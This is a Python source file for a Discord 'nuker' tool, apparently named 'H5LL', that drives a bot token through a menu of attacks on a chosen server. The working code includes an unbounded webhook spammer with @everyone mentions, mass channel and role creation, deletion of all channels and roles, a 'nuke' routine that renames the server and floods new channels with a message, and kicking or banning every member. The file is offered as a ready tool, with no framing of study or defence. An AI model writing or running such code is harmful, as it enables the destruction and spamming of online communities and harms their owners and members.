import os
import sys
import subprocess
import subprocess
import time
import threading
def loading_message():
    loading_dots = ["", ".", "..", "..."]
    message = "Installing Client"

    while not installation_complete:
        for dot in loading_dots:
            print(f"{message}{dot}", end="\r")
            time.sleep(1)

def install_packages(packages):
    for package in packages:
        subprocess.run(["python", "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

packages = ["requests", "discord.py", "colorama", "discord", "pathlib"]
installation_complete = False

loading_thread = threading.Thread(target=loading_message)
loading_thread.start()
install_packages(packages)
installation_complete = True
loading_thread.join()


#loading screenended
import requests
from colorama import Fore; import fade
from colorama import init, Fore, Style
import random
import discord
import asyncio
import pathlib
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands
from discord.ext import commands
from discord.ext import tasks
from discord.utils import get
import json
from pathlib import Path
from colorama import Fore , Style
import tracemalloc
import datetime
#end of imports



timedate = datetime.datetime.now().strftime("%H:%M:%S")


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)



text = """
              ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
              ██▪▐█▀▄.▀·██•  ██•  
              ██▀▀█▐▀▀▪▄██ ▪ ██ ▪ 
              ██▌▐▀▐█▄▄▌▐█▌ ▄▐█▌ ▄
              ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 


        [01] - Webhook Spammer        [05] - Nuke               [09] - Kick Guild                        
        [02] - Channel Creator        [06] - Token Checker      [10] - Ban Guild
        [03] - Role Creator           [07] - Name Changer       [11] - Exit
        [04] - Channel Deleter        [08] - DisplayChange Server      
"""


purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]


lines = text.split("\n")


optionsbanner = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            optionsbanner += purple_colors[color_index] + line[i]
        else:
            optionsbanner += " "
    optionsbanner += Style.RESET_ALL  
    optionsbanner += "\n"
















init(autoreset=False)


text = """
                             ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
                             ██▪▐█▀▄.▀·██•  ██•  
                             ██▀▀█▐▀▀▪▄██ ▪ ██ ▪ 
                             ██▌▐▀▐█▄▄▌▐█▌ ▄▐█▌ ▄
                             ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
"""


purple_colors = [
    "\033[38;2;139;0;139m",
    "\033[38;2;128;0;128m",
    "\033[38;2;118;0;118m",
    "\033[38;2;108;0;108m",
    "\033[38;2;98;0;98m",
    "\033[38;2;88;0;88m",
    "\033[38;2;78;0;78m",
    "\033[38;2;68;0;68m",
    "\033[38;2;58;0;58m",
    "\033[38;2;48;0;48m",
]


lines = text.split("\n")


bannermainmenu = ""
for line in lines:
    for i in range(len(line)):
        if line[i] != " ":
            color_index = i % len(purple_colors)
            bannermainmenu += purple_colors[color_index] + line[i]
        else:
            bannermainmenu += " "
    bannermainmenu += Style.RESET_ALL 
    bannermainmenu += "\n"









print("\033[95m")
        
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


clear_screen()        





     

 
   
 
         
        


try:
    import requests
except ImportError:
    import subprocess
    import sys

    # Attempt to install requests using pip
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests














def mainmenu():


        print(optionsbanner)

    
    

    


 






        choice = input(f"\033[90m{timedate}\033[38;2;139;0;139m  [H5LL] »   ")
        if choice == "1":
            webhook_spammer()

        
        elif choice == "2":
            create_channels()
        elif choice == "3":
                RoleCreator()
            
        elif choice == "4":
         channel_deleter()
         time.sleep(0.95)
         mainmenu()
        
         

        elif choice == "5":
            nuke()

        elif choice == "6":
            bot_token_checker()

        
        elif choice == "7":
            change_bot_username()
        elif choice == "8":
           asyncio.run(changer())
        elif choice == "9":
            kick_all()
        elif choice == "10":
            ban_all()
        elif choice == "11":
            return
        else:
            print("Invalid choice. Please enter any of the listed options.")
            time.sleep(1)
            mainmenu()

    
    


#webhook spammer  OPTION 1


def webhook_spammer():
    clear_screen()
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, "webhook.txt")

    if not os.path.exists(file_path):
        print("The 'webhook.txt' file does not exist in the script's directory. Creating it now...")
        with open(file_path, "w") as file:
            pass

    with open(file_path, "r") as file:
        new_webhook_url = file.readline().strip()

    webhook_url = new_webhook_url

    content = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Message »  ")
    num_times = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Amount Of Times »  ")

    if num_times.lower() == 'inf':
        num_times = float('inf')
    else:
        num_times = int(num_times)

    include_mentions = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Include Mentions y/n »  ").lower() == 'y'

    if include_mentions:
        content = f"{content}\n\n@everyone @here"

    delay = float(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Delay »  "))

    for _ in range(num_times):
        payload = {"content": content}
        response = requests.post(webhook_url, json=payload)

        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"\033[32m""Message sent successfully!")
            time.sleep(0.1)
            print("✅")

        time.sleep(delay)


#channels create or spammer OPTION 2


def create_channels():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
      print("The 'bottoken.txt' file does not exist. Creating it now...")
    bottoken_file_path.touch()
    
    with open(bottoken_file_path, "r") as file:
      TOKEN = file.readline().strip()


    guild_id = input(f"\033[90m{timedate}\033[38;2;139;0;139m  Guild Id »  ")
    num_channels_to_create = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m  Amount Of Times »  "))
    base_channel_name = input(f"\033[90m{timedate}\033[38;2;139;0;139m  Name Of Channel »  ")

    intents = discord.Intents.default()
    intents.guilds = True

    client = discord.Client(intents=intents)
    

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name} ({client.user.id})')
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if guild is not None:
            for i in range(1, num_channels_to_create + 1):
                channel_name = f'{base_channel_name}-{i}'
                await guild.create_text_channel(channel_name)
                print(f'Created channel: {channel_name}')
        await client.logout()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(client.start(TOKEN))

#delete channels OPTION 3

def RoleCreator():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
      print("The 'bottoken.txt' file does not exist. Creating it now...")
    bottoken_file_path.touch()
    
    with open(bottoken_file_path, "r") as file:
      TOKEN = file.readline().strip()
    
    intents = discord.Intents.default()
    intents.guilds = True 
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name}')

        GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")
        guild = client.get_guild(int(GUILD_ID))

        if guild:
            role_name = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Name Of Roles »  ")
            num_roles = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Amount Of Times »  "))

            for i in range(num_roles):
                color = discord.Colour.random()

                await guild.create_role(name=role_name, colour=color)
                print(f"Role '{role_name}' {i + 1}/{num_roles} has been created with color {color}")

            print(f"Created {num_roles} roles with the name '{role_name}' in the server: {guild.name}")
        else:
            print(f"Guild with ID {GUILD_ID} not found.")

        client.close()

    client.run(TOKEN)

#channel deleter option 4

def channel_deleter():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
      print("The 'bottoken.txt' file does not exist. Creating it now...")
    bottoken_file_path.touch()
    
    with open(bottoken_file_path, "r") as file:
      TOKEN = file.readline().strip()
    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))

    intents = discord.Intents.default()
    intents.guilds = True

    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {bot.user.name}')

        
        guild = bot.get_guild(GUILD_ID)

        if guild is not None:
            print(f'Connected to guild: {guild.name}')

            # Delete all text channels
            for text_channel in guild.text_channels:
                await text_channel.delete()
                print(f'Deleted text channel: {text_channel.name}')

            # Delete all voice channels
            for voice_channel in guild.voice_channels:
                await voice_channel.delete()
                print(f'Deleted voice channel: {voice_channel.name}')
        else:
            print('Bot is not a member of the specified server.')

    bot.run(TOKEN)







#NUKER DEVELOPMENT - like done

def nuke():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
      print("The 'bottoken.txt' file does not exist. Creating it now...")
    bottoken_file_path.touch()
    
    with open(bottoken_file_path, "r") as file:
      TOKEN = file.readline().strip()

    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))

    intents = discord.Intents.default()
    intents.all()

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name} ({client.user.id})')
        guild = discord.utils.get(client.guilds, id=GUILD_ID)
        if guild:
            print(f'\033[91mServer Name: {guild.name}')
            print(f'\033[93mServer ID: {guild.id}')
            print(f'\033[92mServer Owner: {guild.owner}')
            print(f'\033[94mServer Member Count: {guild.member_count}')

            try:
                # Ask for the new server name
                new_server_name = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Server Name »  ")

                # Change the server name
                await guild.edit(name=new_server_name)
                print(f'Server name changed to "{new_server_name}"')
                time.sleep(1)
                clear_screen()

                print(f'Nuking the server "{new_server_name}" ({guild.id})...')

                for channel in guild.channels:
                    try:
                        await channel.delete()
                        time.sleep(0.5)  # Rate limit friendly delay
                    except Exception as e:
                        print(f"Error deleting channel {channel.name}: {e}")

                print("All channels have been deleted.")

                for role in guild.roles:
                    if role.name != "@everyone":
                        try:
                            await role.delete()
                            print(f"Role {role.name} deleted.")
                        except discord.Forbidden:
                            print(f"Skipping role {role.name} due to missing permissions.")
                        except Exception as e:
                            print(f"Error deleting role {role.name}: {e}")

                clear_screen()
                channel_count = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Amount Of Channels »  "))
                channel_name = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Name Of Channels »  ")
                pick_message = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Content »  ")
                for i in range(channel_count):
                    try:
                        channel = await guild.create_text_channel(name=channel_name)
                        await channel.send(pick_message)
                        time.sleep(0.5)  # Rate limit friendly delay
                        print(f"Channel {channel_name} {i + 1} created and message sent.")
                    except Exception as e:
                        print(f"Error creating channel or sending message: {e}")

                await client.close()
            except Exception as e:
                print(f"An error occurred during the nuking process: {e}")
        else:
            print(f"Guild with ID {GUILD_ID} not found.")

    try:
        client.run(TOKEN)
    except discord.LoginFailure:
        print("Invalid bot token. Please check the 'bottoken.txt' file.")
    except Exception as e:
        print(f"An error occurred while trying to log in: {e}")

    return mainmenu()


    


#TOKEN CHECKER

def bot_token_checker():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
      print("The 'bottoken.txt' file does not exist. Creating it now...")
    bottoken_file_path.touch()
    
    with open(bottoken_file_path, "r") as file:
      TOKEN = file.readline().strip()

    
    intents = discord.Intents.default()
    intents.guilds = True
    client = discord.Client(intents=intents)
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        clear_screen()
        print(f' BOT NAMED {bot.user.name} IS WORKING')
    bot.run(TOKEN)
    time.sleep(2)
    return mainmenu()





# NAME CHANGER IN THE SERVER


def change_bot_username():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
      print("The 'bottoken.txt' file does not exist. Creating it now...")
    bottoken_file_path.touch()
    
    with open(bottoken_file_path, "r") as file:
      TOKEN = file.readline().strip()


    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))

    intents = discord.Intents.default()
    intents.all()

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name} ({client.user.id})')
        guild = discord.utils.get(client.guilds, id=GUILD_ID)
        if guild:
            print(f'Server Name: {guild.name}')
            print(f'Server ID: {guild.id}')
            print(f'Server Owner: {guild.owner}')
            print(f'Server Member Count: {guild.member_count}')
            print(" ")
            print(" ")

            new_nickname = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Name »  ")
            try:
                member = guild.get_member(client.user.id)
                await member.edit(nick=new_nickname)
                print(f'Changed bot nickname on server "{guild.name}" to {new_nickname}')
            except Exception as e:
                print(f'An error occurred while changing the nickname: {str(e)}')

    client.run(TOKEN)




async def changer():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
      print("The 'bottoken.txt' file does not exist. Creating it now...")
    bottoken_file_path.touch()
    
    with open(bottoken_file_path, "r") as file:
      TOKEN = file.readline().strip()

    
    GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")

    
    NEW_DISPLAY_NAME = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Name Content »  ")

    # Create a bot instance
    intents = discord.Intents.default()
    intents.members = True  
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name}')
        guild = client.get_guild(int(GUILD_ID))
        if guild:
            for member in guild.members:
                try:
                    await member.edit(nick=NEW_DISPLAY_NAME)
                    print(f"Changed display name for {member.name}#{member.discriminator} to {NEW_DISPLAY_NAME}")
                except Exception as e:
                    print(f"Failed to change display name for {member.name}#{member.discriminator}: {str(e)}")

    await start_bot(client, TOKEN)

async def start_bot(client, token):
    await client.start(token)
        




def kick_all():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
        print("The 'bottoken.txt' file does not exist. Creating it now...")
        bottoken_file_path.touch()

    with open(bottoken_file_path, "r") as file:
        TOKEN = file.readline().strip()

    intents = discord.Intents.default()
    intents.members = True
    bot = commands.Bot(command_prefix="!", intents=intents)
    GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")
    kick_count = 0
    rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE, Fore.BLACK,
                      Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
                      Fore.LIGHTCYAN_EX]

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        time.sleep(1)
        clear_screen()
        guild = bot.get_guild(int(GUILD_ID))
        nonlocal kick_count
        for member in guild.members:
            if member != bot.user:  
                try:
                    await member.kick()
                    color = rainbow_colors[kick_count % len(rainbow_colors)]
                    kick_count += 1
                    print(f'\033[38;2;139;0;139mKicked {member.name} ({color}{kick_count}{Style.RESET_ALL})\033[38;2;139;0;139m')
                except discord.Forbidden:
                    print(f'\033[38;2;139;0;139mSkipped {member.name} (Insufficient permissions)\033[38;2;139;0;139m')

    bot.run(TOKEN)




def ban_all():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    bottoken_file_path = script_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
        print("The 'bottoken.txt' file does not exist. Creating it now...")
        bottoken_file_path.touch()

    with open(bottoken_file_path, "r") as file:
        TOKEN = file.readline().strip()

    intents = discord.Intents.default()
    intents.members = True
    bot = commands.Bot(command_prefix="!", intents=intents)
    GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")
    BAN_REASON = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Reason »  ")
    ban_count = 0
    rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE, Fore.BLACK,
                      Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
                      Fore.LIGHTCYAN_EX]

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        time.sleep(1)
        clear_screen()
        guild = bot.get_guild(int(GUILD_ID))
        nonlocal ban_count
        for member in guild.members:
            if member != bot.user:  
                try:
                    await member.ban(reason=BAN_REASON)
                    color = rainbow_colors[ban_count % len(rainbow_colors)]
                    ban_count += 1
                    print(f'\033[38;2;139;0;139mBanned {member.name} ({color}{ban_count}{Style.RESET_ALL})\033[38;2;139;0;139m')
                except discord.Forbidden:
                    print(f'\033[38;2;139;0;139mSkipped {member.name} (Insufficient permissions)\033[38;2;139;0;139m')
    bot.run(TOKEN)






if __name__ == "__main__":
    mainmenu()



# THIS IS THE END.